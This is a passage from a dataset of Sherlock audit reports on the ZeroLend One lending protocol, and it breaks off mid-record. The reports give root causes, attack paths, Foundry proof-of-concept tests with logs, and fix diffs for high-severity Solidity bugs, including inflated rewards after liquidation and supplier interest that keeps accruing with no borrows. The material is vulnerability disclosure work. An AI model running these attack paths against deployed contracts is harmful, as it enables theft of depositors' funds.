supply balance which potentially could fail.\n```solidity\n  function executeWithdraw(\n    ...\n  ) external returns (DataTypes.SharesType memory burnt) {\n    DataTypes.ReserveData storage reserve = reservesData[params.asset];\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n    reserve.updateState(params.reserveFactor, cache);\n\n>   uint256 balance = balances[params.asset][params.position].getSupplyBalance(cache.nextLiquidityIndex);\n    ...\n```\n\n2. In `BorrowLogic.executeRepay`, it would fail\n  - to do full-repay because `payback.assets` is not the total debt amount\n  - to do `setBorrwing(reserve.id, false)` because `getDebtBalance` almost unlikely goes 0, as it can't do full repay\n```solidity\n  function executeRepay(\n    ...\n  ) external returns (DataTypes.SharesType memory payback) {\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n    reserve.updateState(params.reserveFactor, cache);\n>   payback.assets = balances.getDebtBalance(cache.nextBorrowIndex);\n\n    // Allows a user to max repay without leaving dust from interest.\n    if (params.amount == type(uint256).max) {\n>     params.amount = payback.assets;\n    }\n\n    ...\n\n>   if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n      userConfig.setBorrowing(reserve.id, false);\n    }\n\n    IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);\n    emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);\n  }\n```\n\n3. In `NFTPositionManagerSetter._supply` and `NFTPositionManagerSetter._borrow`, they call `NFTRewardsDistributor._handleSupplies` and `NFTRewardsDistributor._handleDebt` with wrong balance amounts which would lead to incorrect reward distribution.\n```solidity\n  function _supply(AssetOperationParams memory params) internal nonReentrant {\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    IPool pool = IPool(_positions[params.tokenId].pool);\n\n    IERC20(params.asset).forceApprove(address(pool), params.amount);\n    pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);\n\n    // update incentives\n>   uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);\n    _handleSupplies(address(pool), params.asset, params.tokenId, balance);\n\n    emit NFTEventsLib.Supply(params.asset, params.tokenId, params.amount);\n  }\n\n  function _borrow(AssetOperationParams memory params) internal nonReentrant {\n    if (params.target == address(0)) revert NFTErrorsLib.ZeroAddressNotAllowed();\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    // check permissions\n    _isAuthorizedForToken(params.tokenId);\n\n    IPool pool = IPool(_positions[params.tokenId].pool);\n    pool.borrow(params.asset, params.target, params.amount, params.tokenId, params.data);\n\n    // update incentives\n>   uint256 balance = pool.getDebt(params.asset, address(this), params.tokenId);\n    _handleDebt(address(pool), params.asset, params.tokenId, balance);\n\n    emit NFTEventsLib.Borrow(params.asset, params.amount, params.tokenId);\n  }\n```\n\n4. In `NFTPositionManagerSetter._repay`, wrong balance is used to estimate debt status and refunds.\n  - It will almost likely revert with `NFTErrorsLib.BalanceMisMatch` because `debtBalance` is share amount versus `repaid.assets` is asset amount\n  - `currentDebtBalance` will never go 0 because it almost unlikely gets repaid in full, hence refund never happens\n  - `_handleDebt` would work wrongly due to incorrect balance \n```solidity\n  function _repay(AssetOperationParams memory params) internal nonReentrant {\n    ...\n>   uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n>   uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n\n    if (previousDebtBalance - currentDebtBalance != repaid.assets) {\n      revert NFTErrorsLib.BalanceMisMatch();\n    }\n\n    if (currentDebtBalance == 0 && repaid.assets < params.amount) {\n      asset.safeTransfer(msg.sender, params.amount - repaid.assets);\n    }\n\n    // update incentives\n    _handleDebt(address(pool), params.asset, params.tokenId, currentDebtBalance);\n\n    emit NFTEventsLib.Repay(params.asset, params.amount, params.tokenId);\n  }\n```\n\n5. In `CuratedVault.totalAssets`, it returns wrong asset amount.\n```solidity\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n>     assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L126-L140\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L118\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L126\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L44-L82\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119-L121\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372\n\n## Tool used\nManual Review, Foundary\n\n## Recommendation\nThe `getSupplyBalance` and `getDebtBalance` functions need an update to accurately reflect the balance. Referring to `getSupplyBalance` and `getDebtBalance` functions from `ReserveSuppliesConfiguration`, we can make updates as following:\n\n```diff\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-   return self.supplyShares + increase;\n+   return self.supplyShares.rayMul(index);\n  }\n\n  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {\n-   uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);\n-   return self.debtShares + increase;\n+   return self.debtShares.rayMul(index);\n  }\n```\n\n\n\n## Discussion\n\n**DemoreXTess**\n\nEscalate\n\nAs I stated in #107 , there are two issues categorized in the same pool. I know it's same problem which is applied to two different variable but the debt and supply are completely different things. Those issues have completely different impacts on the protocol even the problem is similar.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> As I stated in #107 , there are two issues categorized in the same pool. I know it's same problem which is applied to two different variable but the debt and supply are completely different things. Those issues have completely different impacts on the protocol even the problem is similar.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Tomiwasa0**\n\n2 different issues with 2 different impacts. 2 different root cause but similar. \nThis should be separated into two issues\nIncorrect Supply - 189, 210, 1, 19, 29, 84,127,149, 51, 243, 250, 269, 313, 357, 420, 440, 491, 506.\nIncorrect Debt - 190, 208, 2, 30 126, 152, 157, 161, 180, 254 ,270, 314, 421, 459. \n\nSome Watsons submitted this together - 52, 473, 138, 272, 444, 469, 503, 504, 516. \n\nI missed some anyone can help add them also. But my point is in line with @DemoreXTess  these are two different issues with different impacts hence they should be classified appropriately. Thank you.\n\n**cvetanovv**\n\nI disagree with the escalation.\n\nThe Lead Judge correctly duplicated them under the same logical error rule.\n\n> If the following issues appear in multiple places, even in different contracts\n> - Issues with the same logic mistake.\n\nMoreover, the root cause is the same. It is that the functions return `share amount` instead of `asset amount`.\n\nYou might also look at some Watson's who have written two issues and see how the difference is only a few words (for example, #151 and #152).\n\nPlanning to reject the escalation and leave the issue as is.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473/#issuecomment-2391694709): rejected",
      "summary": "\nSummary: This bug report discusses an error in the calculation of the supply/debt balance of a position, which affects core system functionalities. The error occurs in the `PositionBalanceConfiguration` library, where two methods return the `share amount` instead of the `asset amount` held, resulting in incorrect balances. This impacts operations such as lending, borrowing, and reward distribution. The bug has been identified and confirmed through manual review and the Foundary tool. A recommendation is made to update the affected functions to accurately reflect the balance. There was a discussion about whether this issue should be escalated as two separate issues, but it was ultimately decided to leave it as is. The bug has been classified as High and has duplicates.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473",
      "tags": [],
      "finders": [
        "DenTonylifer",
        "JCN",
        "perseus",
        "Tendency",
        "dany.armstrong90",
        "trachev",
        "0xAlix2",
        "silver\\_eth",
        "BiasedMerc",
        "iamnmt",
        "lemonmon",
        "joshuajee",
        "jah",
        "KupiaSec",
        "denzi\\_",
        "JuggerNaut63",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "Nihavent",
        "neon2835",
        "dhank",
        "Varun\\_05",
        "Bigsam",
        "oxelmiguel",
        "TessKimy",
        "almurhasan",
        "Honour",
        "coffiasd",
        "charlesjhongc"
      ]
    },
    {
      "id": "41820",
      "title": "H-10: Interest rate is updated before updating the debt when repaying debt",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/413 \n\n## Found by \n000000, 0xweebad, A2-security, JCN, Obsidian, Tendency, TessKimy, Varun\\_05, almurhasan, ether\\_sky, imsrybr0, lemonmon, stuart\\_the\\_minion, trachev\n### Summary\n\nInterest rate is updated before updating the debt when repaying debt in `BorrowLogic@executeRepay` leading to an incorrect total debt being used when calculating the new interest rates and causing suppliers to keep accruing interest based on the previous debt and even if there are no ongoing borrows anymore.\n\n### Root Cause\n\n[BorrowLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L117-L161)\n```solidity\n  function executeRepay(\n    DataTypes.ReserveData storage reserve,\n    DataTypes.PositionBalance storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies,\n    DataTypes.UserConfigurationMap storage userConfig,\n    DataTypes.ExecuteRepayParams memory params\n  ) external returns (DataTypes.SharesType memory payback) {\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n    reserve.updateState(params.reserveFactor, cache);\n    payback.assets = balances.getDebtBalance(cache.nextBorrowIndex);\n\n    // Allows a user to max repay without leaving dust from interest.\n    if (params.amount == type(uint256).max) {\n      params.amount = payback.assets;\n    }\n\n    ValidationLogic.validateRepay(params.amount, payback.assets);\n\n    // If paybackAmount is more than what the user wants to payback, the set it to the\n    // user input (ie params.amount)\n    if (params.amount < payback.assets) payback.assets = params.amount;\n\n    reserve.updateInterestRates( // <==== Audit\n      totalSupplies,\n      cache,\n      params.asset,\n      IPool(params.pool).getReserveFactor(),\n      payback.assets,\n      0,\n      params.position,\n      params.data.interestRateData\n    );\n\n    // update balances and total supplies\n    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex); // <==== Audit\n    cache.nextDebtShares = totalSupplies.debtShares; // <==== Audit\n\n    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n      userConfig.setBorrowing(reserve.id, false);\n    }\n\n    IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);\n    emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);\n  }\n```\n\n[ReserveLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L145-L182)\n```solidity\n  function updateInterestRates(\n    DataTypes.ReserveData storage _reserve,\n    DataTypes.ReserveSupplies storage totalSupplies,\n    DataTypes.ReserveCache memory _cache,\n    address _reserveAddress,\n    uint256 _reserveFactor,\n    uint256 _liquidityAdded,\n    uint256 _liquidityTaken,\n    bytes32 _position,\n    bytes memory _data\n  ) internal {\n    UpdateInterestRatesLocalVars memory vars;\n\n    vars.totalDebt = _cache.nextDebtShares.rayMul(_cache.nextBorrowIndex); // <==== Audit\n\n    (vars.nextLiquidityRate, vars.nextBorrowRate) = IReserveInterestRateStrategy(_reserve.interestRateStrategyAddress)\n      .calculateInterestRates(\n      _position,\n      _data,\n      DataTypes.CalculateInterestRatesParams({\n        liquidityAdded: _liquidityAdded, // <==== Audit\n        liquidityTaken: _liquidityTaken,\n        totalDebt: vars.totalDebt, // <==== Audit\n        reserveFactor: _reserveFactor,\n        reserve: _reserveAddress\n      })\n    );\n\n    _reserve.liquidityRate = vars.nextLiquidityRate.toUint128();\n    _reserve.borrowRate = vars.nextBorrowRate.toUint128();\n\n    if (_liquidityAdded > 0) totalSupplies.underlyingBalance += _liquidityAdded.toUint128();\n    else if (_liquidityTaken > 0) totalSupplies.underlyingBalance -= _liquidityTaken.toUint128();\n\n    emit PoolEventsLib.ReserveDataUpdated(\n      _reserveAddress, vars.nextLiquidityRate, vars.nextBorrowRate, _cache.nextLiquidityIndex, _cache.nextBorrowIndex\n    );\n  }\n```\n\nInterest rate is updated before repaying the debt and updating the cached `nextDebtShares` which is then used in the interest rate calculation causing it to return a wrong interest rate as it behaves like liquidity was just supplied by the borrower without a change in debt.\n\n### Internal pre-conditions\n\nN/A\n\n### External pre-conditions\n\nN/A\n\n### Attack Path\n\n1. Bob supplies `tokenB`\n2. Alice supplies `tokenA`\n3. Alice borrows `tokenB` causing the utilization goes up and interest rate is updated\n4. Bob starts accruing interest\n5. Alice fully repays `tokenB` but the interest rate is not updated correctly\n6. Bob keeps accruing interest\n\n### Impact\n\nBob keeps accruing interest rate based on the previous debt and even if there are no ongoing borrows and can withdraw it at the expense of other suppliers.\n\n### PoC\n\n```solidity\n  function testRepay() external {\n    _mintAndApprove(alice, tokenA, 3000 ether, address(pool));\n    _mintAndApprove(alice, tokenB, 1000 ether, address(pool));\n    _mintAndApprove(bob, tokenB, 5000 ether, address(pool));\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, 500 ether, 0);\n\n    skip(12);\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 1000 ether, 0);\n\n    skip(12);\n    oracleA.updateRoundTimestamp();\n    oracleB.updateRoundTimestamp();\n    pool.borrowSimple(address(tokenB), alice, 375 ether, 0);\n\n    skip(12);\n    pool.repaySimple(address(tokenB), type(uint256).max, 0);\n\n    vm.stopPrank();\n\n    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));\n    uint256 bobSupplyAssetsBefore = pool.supplyAssets(address(tokenB), bobPos);\n\n    skip(24 * 30 * 60 * 60);\n\n    pool.forceUpdateReserve(address(tokenB));\n\n    assertGt(pool.supplyAssets(address(tokenB), bobPos), bobSupplyAssetsBefore); // Bob accrued interest even if there are no borrows anymore\n\n    vm.startPrank(bob);\n    // Reverts because Bob shares with the accrued interest exceed the pool balance but\n    // succeed if there were other suppliers.\n    vm.expectRevert();\n    pool.withdrawSimple(address(tokenB), bob, type(uint256).max, 0);\n\n    vm.stopPrank();\n  }\n```\n\n### Mitigation\n\n```diff\ndiff --git a/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol b/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol\nindex 92806b1..c070fb1 100644\n--- a/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol\n+++ b/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol\n@@ -136,6 +136,14 @@ library BorrowLogic {\n     // user input (ie params.amount)\n     if (params.amount < payback.assets) payback.assets = params.amount;\n\n+    // update balances and total supplies\n+    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex);\n+    cache.nextDebtShares = totalSupplies.debtShares;\n+\n+    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n+      userConfig.setBorrowing(reserve.id, false);\n+    }\n+\n     reserve.updateInterestRates(\n       totalSupplies,\n       cache,\n@@ -147,14 +155,6 @@ library BorrowLogic {\n       params.data.interestRateData\n     );\n\n-    // update balances and total supplies\n-    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex);\n-    cache.nextDebtShares = totalSupplies.debtShares;\n-\n-    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n-      userConfig.setBorrowing(reserve.id, false);\n-    }\n-\n     IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);\n     emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);\n   }\n```",
      "summary": "\nThe bug report discusses an issue with the interest rate being updated before the debt is updated when repaying debt in a specific contract. This leads to an incorrect total debt being used when calculating new interest rates, causing suppliers to continue accruing interest even if there are no ongoing borrows. The root cause of this issue is due to the interest rate being updated before the debt is repaid and the cached debt being used in the interest rate calculation. This can potentially allow a user to withdraw more funds than they should at the expense of other suppliers. The report includes a PoC (proof of concept) to demonstrate the bug and suggests a mitigation to fix the issue. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/413",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "lemonmon",
        "0xweebad",
        "imsrybr0",
        "TessKimy",
        "JCN",
        "Tendency",
        "000000",
        "trachev",
        "almurhasan",
        "ether\\_sky",
        "Obsidian",
        "Varun\\_05",
        "A2-security"
      ]
    },
    {
      "id": "41819",
      "title": "H-9: Function `executeMintToTreasury` will incorrectly reduce the `supplyShares`, therefore prevent the last users  from withdrawing",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/375 \n\n## Found by \n000000, 0xAlix2, 0xc0ffEE, A2-security, Honour, KupiaSec, Nihavent, Obsidian, Tendency, Valy001, Varun\\_05, coffiasd, ether\\_sky, iamnmt, imsrybr0, lemonmon, silver\\_eth, stuart\\_the\\_minion, trachev\n### Summary\n\nThe incorrect reduction in `PoolLogic::executeMintToTreasury` will cause failure of some (likely to be the last) user's withdrawal, and the fund will be locked.\n\n### Root Cause\n\nThe `totalSupply.supplyShares` is supposed to be the sum of `balances.supplyShares`, as they are always updated in tandem: \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L94-L95\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L48-L49\n\nIf this is not held, then some users will not be able to withdraw their collateral, as the `totalSupply.supplyShares` will underflow and revert. \n\nHowever in the `PoolLogic::executeMintToTreasury` updates the `totalSupply.supplyShares` without updating any user's balance. It is because it incorrectly assumes that there is share to be burned, even though the accrued amount was never really minted to the treasury (in that the treasury's share balance was not added). If it is so, that share should be burned from the treasury.\n\nAlso, for example, when premium is added via flashloan, the premium is counted as underlyingBalance: https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L118\n\nTherefore, when the underlying asset is transferred out via `executeMintToTreasury`, the `underlyingBalance` should be updated accordingly.\n\n\n### Internal pre-conditions\n\nNon-zero `accruedToTreasuryShares`\n\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Anybody calls `withdraw` or `withdrawSimple`, it will reduce the `asset`'s `totalSupply.supplyShares` incorrectly.\n\n### impact\n\nThe last user(s) who is trying to withdraw will fail, and their fund will be locked\n\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nSuggestion of mitigation:\n\n\n```solidity\n// PoolLogic.sol\n  function executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);\n\n      IERC20(asset).safeTransfer(treasury, amountToMint);\n-     totalSupply.supplyShares -= accruedToTreasuryShares;\n+     totalSupply.underlyingBalance -= amountToMint;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```",
      "summary": "\nThis bug report highlights an issue with the function `executeMintToTreasury` in the code of a project called ZeroLend. The bug causes the supply of shares to be incorrectly reduced, which prevents the last users from withdrawing their funds. The bug was found by a group of individuals and could potentially lead to the funds being locked. The root cause of the bug is that the total supply of shares is not being updated correctly when the function is called. This means that some users will not be able to withdraw their funds, as the total supply will be too low. The bug can be triggered by anyone calling the `withdraw` or `withdrawSimple` functions. The impact of this bug is that the last users trying to withdraw will fail and their funds will be locked. A potential solution to mitigate this bug is suggested in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/375",
      "tags": [],
      "finders": [
        "imsrybr0",
        "Tendency",
        "trachev",
        "0xAlix2",
        "silver\\_eth",
        "iamnmt",
        "lemonmon",
        "KupiaSec",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "Varun\\_05",
        "Valy001",
        "0xc0ffEE",
        "Honour",
        "coffiasd"
      ]
    },
    {
      "id": "41818",
      "title": "H-8: Liquidated positions will still accrue rewards after being liquidated",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/312 \n\n## Found by \n0xNirix, A2-security, JCN, Obsidian, TessKimy, ZC002, iamnmt, tallo\n### Summary\n\nThe NFTRewardsDistributor contract which is responsible for managing a users rewards using a masterchef algorithm does not get updated with a users underlying position in a pool is liquidated.  This results in the position wrongfully continuing to accrue rewards with an outdated asset balance.\n\n### Root Cause\n\nThe choice to neglect updating the NFTPositionManager contract when a position is liquidated is the root cause of this issue due to the NFTPositionManager contract not containing up-to-date user balances for calculating rewards.\n\n```solidity\n  function earned(uint256 tokenId, bytes32 _assetHash) public view returns (uint256) {\n    return _balances[tokenId][_assetHash].mul(rewardPerToken(_assetHash).sub(userRewardPerTokenPaid[tokenId][_assetHash])).div(1e18).add(\n      rewards[tokenId][_assetHash]\n    );\n  }\n```\nThe above calculations are done in `NFTRewardsDistributor.sol:98` to determine an NFT positions rewards. Due to this bug, the users balance ```_balances[tokenId][_assetHash]``` will be incorrect, leading to overinflated rewards.\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTRewardsDistributor.sol#L98C1-L102C4\n### Internal pre-conditions\n\n1. User needs to have a position NFT registered with the NFTPositionManager contract\n2. The NFTPositionManager needs to have rewards accrual enabled for there to be any impact\n3. The users NFT position needs to be liquidated due to their position being unhealthy\n\n### External pre-conditions\n\n1. Users collateral assets need to drop in enough in price to make their position liquidatable\n2. Any user needs to liquidate the users position\n\n### Attack Path\n\n1. User creates a position\n2. The NFTPositionManager contract will start accruing rewards for the user\n3. The users position's collateral drops in price enough to make their position unhealthy\n4. The user gets liquidated\n5. The user will continue to accrue rewards pertaining to their NFT's position for as long as they wish because the NFTPositionManager believes they are still providing collateral and borrowing assets. \n6. The user withdraws their accrued rewards whenever they wish\n\n### Impact\n\nThe liquidated user will essentially be able to steal rewards from the protocol/other users since their position won't be backed by any collateral.\n\n### PoC\n\n```solidity\n  function test_UserAccruesRewardsWhileLiquidatedBug() public {\n    NFTPositionManager _nftPositionManager = new NFTPositionManager();\n    TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(_nftPositionManager), admin, bytes(''));\n    nftPositionManager = NFTPositionManager(payable(address(proxy)));\n    nftPositionManager.initialize(address(poolFactory), address(0x123123), owner, address(tokenA), address(wethToken));\n\n    uint256 mintAmount = 100 ether;\n    uint256 supplyAmount = 1 ether;\n    uint256 tokenId = 1;\n    bytes32 REWARDS_ALLOCATOR_ROLE = keccak256('REWARDS_ALLOCATOR_ROLE');\n\n    //approvals\n    _mintAndApprove(owner, tokenA, 30e18, address(nftPositionManager));\n    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA\n    _mintAndApprove(bob, tokenB, 2000 ether, address(pool)); // bob 2000 tokenB\n    _mintAndApprove(bob, tokenA, 2000 ether, address(pool)); // bob 2000 tokenB\n\n    //grant the pool some rewards\n    vm.startPrank(owner);\n    nftPositionManager.grantRole(REWARDS_ALLOCATOR_ROLE, owner);\n    nftPositionManager.notifyRewardAmount(10e18, address(pool), address(tokenA), false);\n    vm.stopPrank();\n\n\n    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));\n    INFTPositionManager.AssetOperationParams memory params =\n      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 550 ether, tokenId, data);\n    INFTPositionManager.AssetOperationParams memory params2 =\n      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 750 ether, 2, data);\n    INFTPositionManager.AssetOperationParams memory params3 =\n      INFTPositionManager.AssetOperationParams(address(tokenA), bob, 550 ether, 2, data);\n    INFTPositionManager.AssetOperationParams memory borrowParams =\n      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 100 ether, tokenId, data);\n\n    vm.startPrank(alice);\n    tokenA.approve(address(nftPositionManager), 100000 ether);\n    tokenA.approve(address(pool), 100000 ether);\n    nftPositionManager.mint(address(pool));\n    nftPositionManager.supply(params);\n    console.log(\"Alice deposits %e of token A\", params.amount);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    tokenB.approve(address(nftPositionManager), 100000 ether);\n    tokenA.approve(address(nftPositionManager), 100000 ether);\n    tokenB.approve(address(pool), 100000 ether);\n    nftPositionManager.mint(address(pool));\n    nftPositionManager.supply(params2);\n    nftPositionManager.supply(params3);\n    console.log(\"Bob deposits %e of token A\", params3.amount);\n    vm.stopPrank();\n\n    vm.prank(alice);\n    nftPositionManager.borrow(borrowParams);\n\n\n    bytes32 assetHashA = nftPositionManager.assetHash(address(pool), address(tokenA), false);\n    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));\n    console.log(\"\\nAlice rewards earned before liquidation: %e\", nftPositionManager.earned(1, assetHashA));\n    console.log(\"Bob rewards earned before Alice is Liquidated: %e\\n\", nftPositionManager.earned(2, assetHashA));\n    oracleA.updateAnswer(3e5);\n    vm.prank(bob);\n    console.log(\"Bob liquidates Alice\");\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 550 ether);\n    console.log(\"Skip ahead until end of rewards cycle...\");\n    vm.warp(block.timestamp+14 days);\n\n    console.log(\"\\nAlice rewards earned after liquidation: %e\", nftPositionManager.earned(1, assetHashA));\n    console.log(\"Bob rewards earned after Alice is liquidated: %e\", nftPositionManager.earned(2, assetHashA));\n    console.log(\"Alice rewards equal to Bob rewards: \", nftPositionManager.earned(1, assetHashA) == nftPositionManager.earned(2, assetHashA));\n\n  }\n```\n#### Logs\nOutput:\n  Alice deposits 5.5e20 of token A\n  Bob deposits 5.5e20 of token A\n\n  Alice rewards earned before liquidation: 0e0\n  Bob rewards earned before Alice is Liquidated: 0e0\n\n  Bob liquidates Alice\n  Skip ahead until end of rewards cycle...\n\n  Alice rewards earned after liquidation: 4.99999999999953585e18\n  Bob rewards earned after Alice is liquidated: 4.99999999999953585e18\n  Alice rewards equal to Bob rewards:  true\n\nThe PoC shows that even though Alice was liquidated, she continued to accrue the same amount of rewards as Bob over the time period.\n\n### Mitigation\n\nWhen necessary, the liquidation function should callback to the NFT position contract to update the liquidated users position with the contract so they don't continue to accrue rewards.",
      "summary": "\nThis bug report discusses an issue with the NFTRewardsDistributor contract, which manages a user's rewards using a masterchef algorithm. The problem is that when a user's position in a pool is liquidated, the contract is not updated, resulting in the position continuing to accrue rewards with an outdated asset balance. This means that the user can essentially steal rewards from the protocol or other users. \n\nThe root cause of this issue is neglecting to update the NFTPositionManager contract when a position is liquidated, which leads to incorrect user balances and inflated rewards. This bug can only occur if the user has a position NFT registered with the NFTPositionManager contract and rewards accrual is enabled. The user's position must also be liquidated due to an unhealthy position. \n\nTo exploit this bug, a user would create a position, and the NFTPositionManager contract would start accruing rewards for them. If their position becomes unhealthy and they are liquidated, they will continue to accrue rewards as if they still had collateral. This can happen if the user's collateral assets drop in price enough to make their position liquidatable, and any user can then liquidate their position. \n\nThe impact of this bug is that the liquidated user can steal rewards from the protocol or other users, as their position is not backed by any collateral. The proof of concept provided in the report shows that even after being liquidated, the user continues to accrue the same amount of rewards as before. \n\nTo mitigate this issue, the liquidation function should update the NFTPositionManager contract to prevent the liquidated user from continuing to accrue rewards. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/312",
      "tags": [],
      "finders": [
        "TessKimy",
        "tallo",
        "JCN",
        "ZC002",
        "0xNirix",
        "Obsidian",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41817",
      "title": "H-7: When bad debt is accumulated, the loss is not shared amongst all suppliers, instead the last to withdraw will experience a huge loss",
      "impact": "HIGH",
